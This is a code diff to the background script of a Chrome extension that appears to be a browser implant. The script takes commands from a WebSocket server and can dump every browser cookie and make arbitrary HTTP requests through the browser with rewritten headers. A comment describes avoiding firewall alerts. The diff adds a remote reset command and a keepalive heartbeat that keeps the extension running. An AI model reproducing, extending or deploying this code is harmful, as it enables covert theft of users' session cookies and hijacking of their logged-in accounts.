@@ -22,10 +22,21 @@ const REQUEST_HEADER_BLACKLIST = [
 
 const RPC_CALL_TABLE = {
     'HTTP_REQUEST': perform_http_request,
-    'PONG': () => {}, // NOP, since timestamp is updated on inbound message.
+    'PONG': () => { }, // NOP, since timestamp is updated on inbound message.
     'AUTH': authenticate,
     'GET_COOKIES': get_cookies,
+    'RESET': reset,
 };
+
+
+async function reset(params) {
+    // We've been reset, clear local identifier and reconnect
+    localStorage.clear();
+    websocket.close();
+    websocket = false;
+    initialize();
+    return false;
+}
 
 /*
     Return an array of cookies for the current cookie store.
@@ -33,19 +44,19 @@ const RPC_CALL_TABLE = {
 async function get_cookies(params) {
     // If the "cookies" permission is not available
     // just return an empty array.
-    if(!chrome.cookies) {
+    if (!chrome.cookies) {
         return [];
     }
     return getallcookies({});
 }
 
 function getallcookies(details) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         try {
-            chrome.cookies.getAll(details, function(cookies_array) {
+            chrome.cookies.getAll(details, function (cookies_array) {
                 resolve(cookies_array);
             });
-        } catch(e) {
+        } catch (e) {
             reject(e);
         }
     });
@@ -57,11 +68,10 @@ async function authenticate(params) {
 
     // If no browser ID is already set we generate a
     // new one and return it to the server.
-    if(browser_id === null) {
+    if (browser_id === null) {
         browser_id = uuidv4();
         localStorage.setItem(
-            'browser_id',
-            browser_id
+            'browser_id', browser_id
         );
     }
 
@@ -86,7 +96,7 @@ function get_secure_random_token(bytes_length) {
 }
 
 function uuidv4() {
-  return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+  return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
     (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
   );
 }
@@ -125,7 +135,7 @@ const websocket_check_interval = setInterval(() => {
     const seconds_since_last_live_message = current_timestamp - last_live_connection_timestamp;
 
     if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
-        console.error(`WebSocket does not appear to be live! Restarting the WebSocket connection...`);
+        console.log(`[error] WebSocket does not appear to be live! Restarting the WebSocket connection...`);
 
         try {
             websocket.close();
@@ -219,8 +229,8 @@ async function perform_http_request(params) {
             request_options
         );
     } catch (e) {
-        console.error(`Error occurred while performing fetch:`);
-        console.error(e);
+        console.log(`[error] Error occurred while performing fetch:`);
+        console.log(e);
         return;
     }
 
@@ -240,7 +250,7 @@ async function perform_http_request(params) {
     const redirect_hack_url_prefix = `${location.origin.toString()}/redirect-hack.html?id=`;
 
     // Handler 301, 302, 307 edge case
-    if(response.url.startsWith(redirect_hack_url_prefix)) {
+    if (response.url.startsWith(redirect_hack_url_prefix)) {
         var response_metadata_string = decodeURIComponent(response.url);
         response_metadata_string = response_metadata_string.replace(
             redirect_hack_url_prefix,
@@ -300,11 +310,10 @@ function initialize() {
     // snitch don't alert on a new port connection from Chrome).
     websocket = new WebSocket("ws://127.0.0.1:4343");
 
-    websocket.onopen = function(e) {
-        //websocket.send("My name is John");
+    websocket.onopen = function (e) {
     };
 
-    websocket.onmessage = async function(event) {
+    websocket.onmessage = async function (event) {
         // Update last live connection timestamp
         last_live_connection_timestamp = get_unix_timestamp();
 
@@ -313,13 +322,16 @@ function initialize() {
                 event.data
             );
         } catch (e) {
-            console.error(`Could not parse WebSocket message!`);
-            console.error(e);
+            console.log(`[error] Could not parse WebSocket message!`);
+            console.log(e);
             return
         }
 
         if (parsed_message.action in RPC_CALL_TABLE) {
             const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
+            if (result === false) {
+                return;
+            }
             websocket.send(
                 JSON.stringify({
                     // Use same ID so it can be correlated with the response
@@ -329,11 +341,11 @@ function initialize() {
                 })
             )
         } else {
-            console.error(`No RPC action ${parsed_message.action}!`);
+            console.log(`[error] No RPC action ${parsed_message.action}!`);
         }
     };
 
-    websocket.onclose = function(event) {
+    websocket.onclose = function (event) {
         if (event.wasClean) {
             console.log(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
         } else {
@@ -343,7 +355,7 @@ function initialize() {
         }
     };
 
-    websocket.onerror = function(error) {
+    websocket.onerror = function (error) {
         console.log(`[error] ${error.message}`);
     };
 }
@@ -372,9 +384,9 @@ Additionally, for defense in depth, nothing that isn't initiated by the Chrome e
 is actually processed.
 */
 chrome.webRequest.onBeforeSendHeaders.addListener(
-    function(details) {
+    function (details) {
         // Ensure we only process requests done by the Chrome extension
-        if(details.initiator !== location.origin.toString()) {
+        if (details.initiator !== location.origin.toString()) {
             return
         }
 
@@ -383,7 +395,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
         var headers_to_append = [];
 
     	details.requestHeaders.map(requestHeader => {
-    		if(requestHeader.name === 'X-PLACEHOLDER-SECRET' && requestHeader.value === placeholder_secret_token) {
+    		if (requestHeader.name === 'X-PLACEHOLDER-SECRET' && requestHeader.value === placeholder_secret_token) {
     			has_header_secret = true;
     			header_keys_to_delete.push('X-PLACEHOLDER-SECRET');
     		}
@@ -391,7 +403,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
 
     	// If there's no secret header set with the
     	// proper secret then quit out the proxy replacement.
-    	if(!has_header_secret) {
+    	if (!has_header_secret) {
     		return {
 	            cancel: false
 	        };
@@ -399,11 +411,11 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
 
     	// Get headers to remove and headers to append
     	details.requestHeaders.map(requestHeader => {
-    		if(!requestHeader.name.startsWith('X-PLACEHOLDER-SECRET') && requestHeader.name.startsWith('X-PLACEHOLDER-')) {
+    		if (!requestHeader.name.startsWith('X-PLACEHOLDER-SECRET') && requestHeader.name.startsWith('X-PLACEHOLDER-')) {
     			header_keys_to_delete.push(requestHeader.name);
 
                 // Skip the header if it's in the blacklist (e.g. Cookie)
-                if(REQUEST_HEADER_BLACKLIST.includes(requestHeader.name.replace('X-PLACEHOLDER-', '').toLowerCase())) {
+                if (REQUEST_HEADER_BLACKLIST.includes(requestHeader.name.replace('X-PLACEHOLDER-', '').toLowerCase())) {
                     return
                 }
 
@@ -439,16 +451,16 @@ const REDIRECT_STATUS_CODES = [
     307
 ];
 
-chrome.webRequest.onHeadersReceived.addListener(function(details) {
+chrome.webRequest.onHeadersReceived.addListener(function (details) {
     // Ensure we only process requests done by the Chrome extension
-    if(details.initiator !== location.origin.toString()) {
+    if (details.initiator !== location.origin.toString()) {
         return
     }
 
     // Rewrite Set-Cookie to expose it in fetch()
     var cookies = []
     details.responseHeaders.map(responseHeader => {
-        if(responseHeader.name.toLowerCase() === 'set-cookie') {
+        if (responseHeader.name.toLowerCase() === 'set-cookie') {
             cookies.push(responseHeader.value);
         }
     });
@@ -461,7 +473,7 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
         });
     }
 
-    if(!REDIRECT_STATUS_CODES.includes(details.statusCode)) {
+    if (!REDIRECT_STATUS_CODES.includes(details.statusCode)) {
         return {
             responseHeaders: details.responseHeaders
         }
@@ -481,3 +493,47 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
 }, {
     urls: ["<all_urls>"]
 }, ["blocking", "responseHeaders", "extraHeaders"]);
+
+
+(async () => {
+    // From https://developer.chrome.com/docs/extensions/develop/migrate/to-service-workers#keep_a_service_worker_alive_continuously
+    /**
+     * Tracks when a service worker was last alive and extends the service worker
+     * lifetime by writing the current time to extension storage every 20 seconds.
+     * You should still prepare for unexpected termination - for example, if the
+     * extension process crashes or your extension is manually stopped at
+     * chrome://serviceworker-internals. 
+     */
+    let heartbeatInterval;
+
+    async function runHeartbeat() {
+        localStorage.setItem('last-heartbeat', new Date().getTime());
+    }
+
+    /**
+     * Starts the heartbeat interval which keeps the service worker alive. Call
+     * this sparingly when you are doing work which requires persistence, and call
+     * stopHeartbeat once that work is complete.
+     */
+    async function startHeartbeat() {
+        // Run the heartbeat once at service worker startup.
+        runHeartbeat().then(() => {
+            // Then again every 20 seconds.
+            heartbeatInterval = setInterval(runHeartbeat, 20 * 1000);
+        });
+    }
+
+    async function stopHeartbeat() {
+        clearInterval(heartbeatInterval);
+    }
+
+    /**
+     * Returns the last heartbeat stored in extension storage, or undefined if
+     * the heartbeat has never run before.
+     */
+    async function getLastHeartbeat() {
+        return (localStorage.getItem('last-heartbeat'))['last-heartbeat'];
+    }
+
+    await startHeartbeat();
+})();
